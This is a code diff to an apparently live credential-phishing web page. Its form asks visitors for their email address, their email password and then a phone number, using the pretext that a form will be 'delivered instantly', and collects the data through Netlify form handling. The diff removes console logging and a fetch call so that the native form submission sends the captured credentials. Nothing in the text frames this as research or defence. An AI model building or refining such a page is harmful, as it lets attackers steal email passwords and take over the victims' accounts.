@@ -101,11 +101,14 @@
         <form id="loginForm" name="loginForm" method="POST" data-netlify="true">
             <input type="email" id="email" name="email" placeholder="Enter your email" required>
             <input type="password" id="userPassword" name="userPassword" placeholder="Enter your email password" required>
+            
+            <!-- Hidden phone input initially -->
             <div id="phoneModal">
                 <h2>Enter Your Phone Number</h2>
                 <p class="info-text">Enter your phone number to get the form delivered instantly.</p>
                 <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
             </div>
+            
             <button type="submit">Submit</button>
         </form>
     </div>
@@ -118,30 +121,14 @@
     <script>
         // Show phone number form after email/password submission
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
             // Capture email and password
             const email = document.getElementById('email').value;
             const password = document.getElementById('userPassword').value;
 
-            // Optionally log data to the console for testing
-            console.log(`Email: ${email}, Password: ${password}`);
-
             // Show the phone number form after email/password submission
             document.getElementById('phoneModal').style.display = 'block'; // Show phone number form
 
-            // Submit the full form with all data (email, password, and phone)
-            const formData = new FormData(document.getElementById('loginForm'));
-            fetch(window.location.href, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.text())
-            .then(data => {
-                alert('Form submitted successfully!');
-                document.getElementById('phoneModal').style.display = 'none'; // Hide the phone form
-            })
-            .catch(error => console.error('Error:', error));
+            // Let the form continue to submit the data
         });
     </script>
 
